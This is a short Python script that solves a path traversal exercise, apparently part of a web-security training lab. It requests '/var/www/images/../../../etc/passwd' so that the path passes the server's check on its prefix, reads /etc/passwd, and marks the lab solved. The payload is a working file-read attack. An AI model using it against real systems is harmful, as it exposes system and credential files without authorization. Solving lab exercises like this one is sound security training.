import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession

lab = LabSession()

# server checks that the path starts with the expected base directory
# satisfy the check, then traverse out of it
resp = lab.get("/image", params={"filename": "/var/www/images/../../../etc/passwd"})

if resp.status_code == 200 and "root:" in resp.text:
    lab.success("Got /etc/passwd:")
    print(resp.text)
else:
    lab.fail(f"Traversal failed (status {resp.status_code})")

lab.check_solved()
